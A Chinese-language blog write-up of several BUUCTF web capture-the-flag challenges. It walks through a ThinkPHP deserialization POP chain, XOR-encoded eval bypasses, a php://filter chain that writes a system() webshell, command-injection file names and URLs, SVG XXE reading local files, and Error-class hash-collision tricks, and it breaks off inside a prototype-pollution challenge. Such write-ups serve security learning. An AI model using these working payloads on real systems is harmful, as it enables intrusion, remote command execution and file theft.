---
title: "BUUCTF Web Writeup 8"
date: 2022-11-24T17:00:01+08:00
lastmod: 2022-11-24T17:00:01+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

BUUCTF 刷题记录... (第4页下)

<!--more-->

## [强网杯 2019]Upload

www.tar.gz 源码泄露, ThinkPHP V5.1.35 LTS

/application/web/controller/Register.php

```php
<?php
namespace app\web\controller;
use think\Controller;

class Register extends Controller
{
    public $checker;
    public $registed;

    public function __construct()
    {
        $this->checker=new Index();
    }

    public function register()
    {
        if ($this->checker) {
            if($this->checker->login_check()){
                $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/home";
                $this->redirect($curr_url,302);
                exit();
            }
        }
        if (!empty(input("post.username")) && !empty(input("post.email")) && !empty(input("post.password"))) {
            $email = input("post.email", "", "addslashes");
            $password = input("post.password", "", "addslashes");
            $username = input("post.username", "", "addslashes");
            if($this->check_email($email)) {
                if (empty(db("user")->where("username", $username)->find()) && empty(db("user")->where("email", $email)->find())) {
                    $user_info = ["email" => $email, "password" => md5($password), "username" => $username];
                    if (db("user")->insert($user_info)) {
                        $this->registed = 1;
                        $this->success('Registed successful!', url('../index'));
                    } else {
                        $this->error('Registed failed!', url('../index'));
                    }
                } else {
                    $this->error('Account already exists!', url('../index'));
                }
            }else{
                $this->error('Email illegal!', url('../index'));
            }
        } else {
            $this->error('Something empty!', url('../index'));
        }
    }

    public function check_email($email){
        $pattern = "/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/";
        preg_match($pattern, $email, $matches);
        if(empty($matches)){
            return 0;
        }else{
            return 1;
        }
    }

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }


}
```

/application/web/controller/Profile.php

```php
<?php
namespace app\web\controller;

use think\Controller;

class Profile extends Controller
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;

    public function __construct()
    {
        $this->checker=new Index();
        $this->upload_menu=md5($_SERVER['REMOTE_ADDR']);
        @chdir("../public/upload");
        if(!is_dir($this->upload_menu)){
            @mkdir($this->upload_menu);
        }
        @chdir($this->upload_menu);
    }

    public function upload_img(){
        if($this->checker){
            if(!$this->checker->login_check()){
                $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
                $this->redirect($curr_url,302);
                exit();
            }
        }

        if(!empty($_FILES)){
            $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
            $this->filename=md5($_FILES['upload_file']['name']).".png";
            $this->ext_check();
        }
        if($this->ext) {
            if(getimagesize($this->filename_tmp)) {
                @copy($this->filename_tmp, $this->filename);
                @unlink($this->filename_tmp);
                $this->img="../upload/$this->upload_menu/$this->filename";
                $this->update_img();
            }else{
                $this->error('Forbidden type!', url('../index'));
            }
        }else{
            $this->error('Unknow file type!', url('../index'));
        }
    }

    public function update_img(){
        $user_info=db('user')->where("ID",$this->checker->profile['ID'])->find();
        if(empty($user_info['img']) && $this->img){
            if(db('user')->where('ID',$user_info['ID'])->data(["img"=>addslashes($this->img)])->update()){
                $this->update_cookie();
                $this->success('Upload img successful!', url('../home'));
            }else{
                $this->error('Upload file failed!', url('../index'));
            }
        }
    }

    public function update_cookie(){
        $this->checker->profile['img']=$this->img;
        cookie("user",base64_encode(serialize($this->checker->profile)),3600);
    }

    public function ext_check(){
        $ext_arr=explode(".",$this->filename);
        $this->ext=end($ext_arr);
        if($this->ext=="png"){
            return 1;
        }else{
            return 0;
        }
    }

    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}
```

/application/web/controller/Index.php

```php
<?php
namespace app\web\controller;
use think\Controller;

class Index extends Controller
{
    public $profile;
    public $profile_db;

    public function index()
    {
        if($this->login_check()){
            $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/home";
            $this->redirect($curr_url,302);
            exit();
        }
        return $this->fetch("index");
    }

    public function home(){
        if(!$this->login_check()){
            $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
            $this->redirect($curr_url,302);
            exit();
        }

        if(!$this->check_upload_img()){
            $this->assign("username",$this->profile_db['username']);
            return $this->fetch("upload");
        }else{
            $this->assign("img",$this->profile_db['img']);
            $this->assign("username",$this->profile_db['username']);
            return $this->fetch("home");
        }
    }

    public function login_check(){
        $profile=cookie('user');
        if(!empty($profile)){
            $this->profile=unserialize(base64_decode($profile));
            $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
            if(array_diff($this->profile_db,$this->profile)==null){
                return 1;
            }else{
                return 0;
            }
        }
    }

    public function check_upload_img(){
        if(!empty($this->profile) && !empty($this->profile_db)){
            if(empty($this->profile_db['img'])){
                return 0;
            }else{
                return 1;
            }
        }
    }

    public function logout(){
        cookie("user",null);
        $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
        $this->redirect($curr_url,302);
        exit();
    }

    public function __get($name)
    {
        return "";
    }

}
```

login_check 方法会对 cookie 进行反序列化, 测试用已知的 rce 去打都失败了

但是 Register.php 中存在 \_\_destruct, 猜测是要从这里作为入口点自己构造 pop 链

\_\_destruct 访问 checker 的 index 方法, 之后跳转到 Profile 的 \_\_call, 其中的 `{$name}` 为可变变量的形式

然后通过该方法最终执行到 upload_img

这里有意思的是我们并不是要利用 upload_img 来上传 php 文件, 而是要通过这个方法修改服务器上文件的文件名

首先绕过方法中的前面几个 if 判断, 然后利用反序列化来操纵 filename 和 filename_tmp 两个属性, 最终通过 copy 函数修改文件名

payload 如下

```php
<?php

namespace think{
  class Controller{
  }
}

namespace app\web\controller{

  use think\Controller;

  class Profile extends Controller{

    public $checker = false;
    public $ext = true;
    public $filename_tmp = '../public/upload/c47b21fcf8f0bc8b3920541abd8024fd/fb5c81ed3a220004b71069645f112867.png';
    public $filename = '../public/upload/c47b21fcf8f0bc8b3920541abd8024fd/a.php';
    public $index = 'upload_img';

  }

  // class Profile extends Controller{

  //   public $checker = false;
  //   public $ext = true;
  //   public $except = array(
  //     'index' => 'upload_img',
  //     'filename_tmp' => 'xx',
  //     'filename' => 'yy'
  //   );

  // }

  class Register extends Controller{

    public $checker;
    public $registed = false;
  }
}

namespace {

$b = new app\web\controller\Profile();

$a = new app\web\controller\Register();
$a->checker = $b;

echo serialize($a);

}
```

网上有人将两个属性写到 except 数组里面, 然后通过 \_\_get 方法获取, 实际上没有必要, 相关代码我写在注释里面了

```php
O:27:"app\web\controller\Register":2:{s:7:"checker";O:26:"app\web\controller\Profile":5:{s:7:"checker";b:0;s:3:"ext";b:1;s:12:"filename_tmp";s:86:"../public/upload/c47b21fcf8f0bc8b3920541abd8024fd/fb5c81ed3a220004b71069645f112867.png";s:8:"filename";s:55:"../public/upload/c47b21fcf8f0bc8b3920541abd8024fd/a.php";s:5:"index";s:10:"upload_img";}s:8:"registed";b:0;}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211142031360.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211142035504.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211142035380.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211142036814.png)

## [ISITDTU 2019]EasyPHP

```php
<?php
highlight_file(__FILE__);

$_ = @$_GET['_'];
if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
    die('rosé will not do it');

if ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )
    die('you are so close, omg');

eval($_);
?>
```

参考文章

[https://xz.aliyun.com/t/5677](https://xz.aliyun.com/t/5677)

[https://blog.csdn.net/mochu7777777/article/details/105786114](https://blog.csdn.net/mochu7777777/article/details/105786114)

懒得看了... 这种题实在没有什么意思

```
http://1044a656-b805-4a2e-8555-64b2a5ba07c1.node4.buuoj.cn:81/?_=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));
```

## [HarekazeCTF2019]Avatar Uploader 1

源码 buu 没给, 得自己从 GitHub 上下

[https://github.com/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/avatar_uploader_1/attachments](https://github.com/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/avatar_uploader_1/attachments)

然后这个题目其实是有两个部分, 这道是第一部分, 而第二部分 buu 被单独拆成另一道题了 (遇到的时候再写)

关键文件 upload.php

```php
<?php
error_reporting(0);

require_once('config.php');
require_once('lib/util.php');
require_once('lib/session.php');

$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);

// check whether file is uploaded
if (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {
  error('No file was uploaded.');
}

// check file size
if ($_FILES['file']['size'] > 256000) {
  error('Uploaded file is too large.');
}

// check file type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);
if (!in_array($type, ['image/png'])) {
  error('Uploaded file is not PNG format.');
}

// check file width/height
$size = getimagesize($_FILES['file']['tmp_name']);
if ($size[0] > 256 || $size[1] > 256) {
  error('Uploaded image is too large.');
}
if ($size[2] !== IMAGETYPE_PNG) {
  // I hope this never happens...
  error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');
}

// ok
$filename = bin2hex(random_bytes(4)) . '.png';
move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);

$session->set('avatar', $filename);
flash('info', 'Your avatar has been successfully updated!');
redirect('/');
```

要求 finfo_file 判断为 png, 但是 getimagesize 判断不为 png

[https://www.php.net/manual/zh/function.finfo-file.php](https://www.php.net/manual/zh/function.finfo-file.php)

[https://www.php.net/manual/zh/function.getimagesize](https://www.php.net/manual/zh/function.getimagesize)

有一处 notes

```
Tempting as it may seem to use finfo_file() to validate uploaded image files (Check whether a supposed imagefile really contains an image), the results cannot be trusted. It's not that hard to wrap harmful executable code in a file identified as a GIF for instance.

A better & safer option is to check the result of:

if (!$img = @imagecreatefromgif($uploadedfilename)) {
  trigger_error('Not a GIF image!',E_USER_WARNING);
  // do necessary stuff
}
```

猜测 finfo_file 识别有点问题, 于是随便删点东西

删到只剩 IHDR 的时候出现了 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161229273.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161230699.png)

## [N1CTF 2018]eating_cms

首页需要登录, 猜了个 register.php

```
http://fc7bccd5-1cba-40a9-9d7d-ba5d977bc73d.node4.buuoj.cn:81/register.php
```

注册之后登录

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161407560.png)

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161407068.png)

hint

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161408979.png)

这里不能直接访问, 试了一圈后发现 page 参数存在文件包含

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161412792.png)

之后依次把相关文件都下载下来

function.php

```php
<?php
session_start();
require_once "config.php";
function Hacker()
{
    Header("Location: hacker.php");
    die();
}


function filter_directory()
{
    $keywords = ["flag","manage","ffffllllaaaaggg"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}

function filter_directory_guest()
{
    $keywords = ["flag","manage","ffffllllaaaaggg","info"];
    $uri = parse_url($_SERVER["REQUEST_URI"]);
    parse_str($uri['query'], $query);
//    var_dump($query);
//    die();
    foreach($keywords as $token)
    {
        foreach($query as $k => $v)
        {
            if (stristr($k, $token))
                hacker();
            if (stristr($v, $token))
                hacker();
        }
    }
}

function Filter($string)
{
    global $mysqli;
    $blacklist = "information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password";
    $whitelist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'(),_*`-@=+><";
    for ($i = 0; $i < strlen($string); $i++) {
        if (strpos("$whitelist", $string[$i]) === false) {
            Hacker();
        }
    }
    if (preg_match("/$blacklist/is", $string)) {
        Hacker();
    }
    if (is_string($string)) {
        return $mysqli->real_escape_string($string);
    } else {
        return "";
    }
}

function sql_query($sql_query)
{
    global $mysqli;
    $res = $mysqli->query($sql_query);
    return $res;
}

function login($user, $pass)
{
    $user = Filter($user);
    $pass = md5($pass);
    $sql = "select * from `albert_users` where `username_which_you_do_not_know`= '$user' and `password_which_you_do_not_know_too` = '$pass'";
    echo $sql;
    $res = sql_query($sql);
//    var_dump($res);
//    die();
    if ($res->num_rows) {
        $data = $res->fetch_array();
        $_SESSION['user'] = $data[username_which_you_do_not_know];
        $_SESSION['login'] = 1;
        $_SESSION['isadmin'] = $data[isadmin_which_you_do_not_know_too_too];
        return true;
    } else {
        return false;
    }
    return;
}

function updateadmin($level,$user)
{
    $sql = "update `albert_users` set `isadmin_which_you_do_not_know_too_too` = '$level' where `username_which_you_do_not_know`='$user' ";
    echo $sql;
    $res = sql_query($sql);
//    var_dump($res);
//    die();
//    die($res);
    if ($res == 1) {
        return true;
    } else {
        return false;
    }
    return;
}

function register($user, $pass)
{
    global $mysqli;
    $user = Filter($user);
    $pass = md5($pass);
    $sql = "insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES ('$user','$pass','0')";
    $res = sql_query($sql);
    return $mysqli->insert_id;
}

function logout()
{
    session_destroy();
    Header("Location: index.php");
}

?>
```

user.php

```php
<?php
require_once("function.php");
if( !isset( $_SESSION['user'] )){
    Header("Location: index.php");

}
if($_SESSION['isadmin'] === '1'){
    $oper_you_can_do = $OPERATE_admin;
}else{
    $oper_you_can_do = $OPERATE;
}
//die($_SESSION['isadmin']);
if($_SESSION['isadmin'] === '1'){
    if(!isset($_GET['page']) || $_GET['page'] === ''){
        $page = 'info';
    }else {
        $page = $_GET['page'];
    }
}
else{
    if(!isset($_GET['page'])|| $_GET['page'] === ''){
        $page = 'guest';
    }else {
        $page = $_GET['page'];
        if($page === 'info')
        {
//            echo("<script>alert('no premission to visit info, only admin can, you are guest')</script>");
            Header("Location: user.php?page=guest");
        }
    }
}
filter_directory();
//if(!in_array($page,$oper_you_can_do)){
//    $page = 'info';
//}
include "$page.php";
?>
```

文件包含限制后缀为 php, 试了 pearcmd 不行, 最后找到这个 trick

[https://tttang.com/archive/1395/](https://tttang.com/archive/1395/)

利用 php filter 生成一个命令执行的 webshell

```
<?php system($_GET[1]);;?>
```

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CN.ISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=config.php
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161415092.png)

看 wp 的时候发现非预期了... 其实利用的是 parse_url 解析漏洞

参考文章 [https://www.cnblogs.com/tr1ple/p/11137159.html](https://www.cnblogs.com/tr1ple/p/11137159.html)

```
//user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161420798.png)

```php
<?php
if (FLAG_SIG != 1){
    die("you can not visit it directly");
}else {
    echo "you can find sth in m4aaannngggeee";
}
?>
```

根据文件包含去访问 m4aaannngggeee.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161421432.png)

下面还有个 upllloadddd.php

```php
<?php
$allowtype = array("gif","png","jpg");
$size = 10000000;
$path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";
$filename = $_FILES['file']['name'];
if(is_uploaded_file($_FILES['file']['tmp_name'])){
    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
        die("error:can not move");
    }
}else{
    die("error:not an upload file！");
}
$newfile = $path.$filename;
echo "file upload success<br />";
echo $filename;
$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
echo "<img src='data:image/png;base64,".$picdata."'></img>";
if($_FILES['file']['error']>0){
    unlink($newfile);
    die("Upload file error: ");
}
$ext = array_pop(explode(".",$_FILES['file']['name']));
if(!in_array($ext,$allowtype)){
    unlink($newfile);
}
?>
```

filename 处存在命令注入

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161425452.png)

查看 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161432705.png)

## [FireshellCTF2020]Caas

通过 c 语言头文件包含 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161455457.png)

## [BSidesCF 2019]SVGMagic

svg xxe, flag 名字需要自己猜...

参考文章 [https://zhuanlan.zhihu.com/p/323315064](https://zhuanlan.zhihu.com/p/323315064)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note [
<!ENTITY file SYSTEM "file:///proc/self/cwd/flag.txt" >
]>
<svg height="1000" width="10000">
  <text x="10" y="20">&file;</text>
</svg>
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161527187.png)

## [极客大挑战 2020]Greatphp

```php
<?php
error_reporting(0);
class SYCLOVER {
    public $syc;
    public $lover;

    public function __wakeup(){
        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){
           if(!preg_match("/\<\?php|\(|\)|\"|\'/", $this->syc, $match)){
               eval($this->syc);
           } else {
               die("Try Hard !!");
           }
           
        }
    }
}

if (isset($_GET['great'])){
    unserialize($_GET['great']);
} else {
    highlight_file(__FILE__);
}

?>
```

利用原生类中的 Error/Exception 来绕过哈希比较

参考文章 [https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/](https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/)

原理就是 md5 sha1 函数传入 class 的时候其实会调用它的 \_\_toString 方法, 而 Error/Exception 刚好存在 \_\_toString, 并且显示的错误信息不会包含实例化传入的 code

即我们可以通过改变 code 的内容来构造两个不同异常类, 但这两个类的 \_\_toString 返回结果是相同的

```php
<?php

class SYCLOVER {
    public $syc;
    public $lover;
}

$cmd = 'include $_GET[1];?>';

$a = new Error($cmd, 1); $b = new Error($cmd, 2);

$o = new SYCLOVER();
$o->syc = $a;
$o->lover = $b;

echo urlencode(serialize($o));
```

注意两个异常类得放到一行写, 因为错误信息中会显示当前语句所在的行号

```
http://853ea8a8-7f5f-4242-a388-4a151477d960.node4.buuoj.cn:81/?great=O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A19%3A%22include+%24_GET%5B1%5D%3B%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Cindex.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A20%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A19%3A%22include+%24_GET%5B1%5D%3B%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Cindex.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A20%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D&1=/flag
```

反引号执行命令失败, 换成了 include

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211161759209.png)

## EasyBypass

```php
<?php

highlight_file(__FILE__);

$comm1 = $_GET['comm1'];
$comm2 = $_GET['comm2'];


if(preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
    $comm1 = "";
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
    $comm2 = "";

$flag = "#flag in /flag";

$comm1 = '"' . $comm1 . '"';
$comm2 = '"' . $comm2 . '"';

$cmd = "file $comm1 $comm2";
system($cmd);
?>
```

payload

```
http://cbd215c6-6784-4d72-9a60-292bc9395b31.node4.buuoj.cn:81/?comm1="; tac /fla?; "&comm2=123
```

## [GYCTF2020]Ez_Express

www.zip 泄露

routes/index.js

```javascript
var express = require('express');
var router = express.Router();
const isObject = obj => obj && obj.constructor && obj.constructor === Object;
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) {
      merge(a[attr], b[attr]);
    } else {
      a[attr] = b[attr];
    }
  }
  return a
}
const clone = (a) => {
  return merge({}, a);
}
function safeKeyword(keyword) {
  if(keyword.match(/(admin)/is)) {
      return keyword
  }

  return undefined
}

router.get('/', function (req, res) {
  if(!req.session.user){
    res.redirect('/login');
  }
  res.outputFunctionName=undefined;
  res.render('index',data={'user':req.session.user.user});
});


router.get('/login', function (req, res) {
  res.render('login');
});



router.post('/login', function (req, res) {
  if(req.body.Submit=="register"){
   if(safeKeyword(req.body.userid)){
    res.end("<script>alert('forbid word');history.go(-1);</script>") 
   }
    req.session.user={
      'user':req.body.userid.toUpperCase(),
      'passwd': req.body.pwd,
      'isLogin':false
    }
    res.redirect('/'); 
  }
  else if(req.body.Submit=="login"){
    if(!req.session.user){res.end("<script>alert('register first');history.go(-1);</script>")}
    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){
      req.session.user.isLogin=true;
    }
    else{
      res.end("<script>alert('error passwd');history.go(-1);</script>")
    }
  
  }
  res.redirect('/'); ;
});
router.post('/action', function (req, res) {
